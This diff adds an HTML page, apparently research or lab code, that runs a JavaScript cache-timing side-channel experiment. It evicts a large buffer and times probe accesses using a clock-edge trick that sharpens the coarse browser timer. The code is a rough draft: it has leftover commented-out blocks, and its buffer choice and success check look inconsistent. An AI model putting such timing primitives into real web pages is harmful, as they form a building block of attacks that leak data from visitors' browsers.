@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Cache_Attack</title>
+</head>
+
+<body>
+    <h1>Cache Attack Example</h1>
+    <script>
+
+function nextedge(){
+start = performance.now();
+stop = start;
+count = 0;
+while(start == stop){
+stop = performance.now();
+count++;
+}
+return [count,start,stop];
+}
+
+        var evictionBuffer = new ArrayBuffer(8192 * 1024);
+        var evictionView = new DataView(evictionBuffer);
+        var probeBuffer = new ArrayBuffer(8192 * 1024);
+        var probeView = new DataView(probeBuffer);
+        var current;
+        var flushedTotal = 0;
+        var unflushedTotal = 0;
+
+        var tries = 1;
+        var tests = 10;
+
+        var last = (8192 * 1023) / 64 - 10;
+
+        var correct_count = 0;
+        var wrong_count = 0;
+
+        var MAX = 0;
+        for(i = 0; i < 100; i++){
+            nextedge();
+            [exp,pre,start] = nextedge();
+            MAX = Math.max(exp, MAX);
+        }
+        exp = MAX;
+        grain = start - pre;
+
+        for (var c = 0; c < tests; c++) {
+
+            for (var i = 0; i < ((8192 * 1023) / 64); i++) { 
+                if(i != last)current = evictionView.getUint32(i * 64); 
+            }
+
+            //var beginFirst = window.performance.now();
+
+            nextedge();
+            [exp1,pre,start] = nextedge();
+            current = probeView.getUint32(last);  //1 is the page
+            [remain,stop,post] = nextedge();
+            //console.log(stop,start,exp,remain,grain,(stop-start)+((exp-remain)/exp)*grain);
+            unflushedTime = (stop-start)+((exp-remain)/exp)*grain;
+            unflushedTotal += unflushedTime;
+
+            //var endFirst = window.performance.now();
+            //unflushedTotal += endFirst - beginFirst;
+            //unflushedTime = endFirst - beginFirst;
+
+           /* var beginSecond = window.performance.now();
+            current = probeView.getUint32(last);  //1 is the page
+            var endSecond = window.performance.now();
+            flushedTotal += endSecond - beginSecond;  
+            flushedTime = endFirst - beginFirst;*/ 
+            
+            //if(unflushedTime !== flushedTime)count++;           
+        //}
+
+        //for (var c = 0; c < tests; c++) {
+
+            for (var i = 0; i < ((8192 * 1023) / 64); i++) { 
+                current = evictionView.getUint32(i * 64); 
+            }
+
+            //var beginSecond = window.performance.now();
+
+            nextedge();
+            [exp1,pre,start] = nextedge();
+            current = probeView.getUint32(last);  //1 is the page
+            [remain,stop,post] = nextedge();
+            //console.log(stop,start,exp,remain,grain,(stop-start)+((exp-remain)/exp)*grain);
+            flushedTime = (stop-start)+((exp-remain)/exp)*grain;
+            flushedTotal += flushedTime;
+
+            //var endSecond = window.performance.now();
+            //flushedTotal += endSecond - beginSecond;  
+            //flushedTime = endFirst - beginFirst;     
+            
+            if(unflushedTime > flushedTime)correct_count++;          
+            if(flushedTime > unflushedTime)wrong_count++;           
+        }
+
+        console.log(flushedTotal, unflushedTotal,correct_count,wrong_count);
+
+        console.log({
+            flushedAverage: flushedTotal / tests,
+            unflushedAverage: unflushedTotal / tests,
+        });
+        
+        document.write("flushedAverage: (" + flushedTotal + ")\n");
+        document.write("unflushedAverage: (" + unflushedTotal + ")\n");
+        document.write("count: (" + correct_count + ")\n");
+
+    </script>
+</body>
+
+</html>
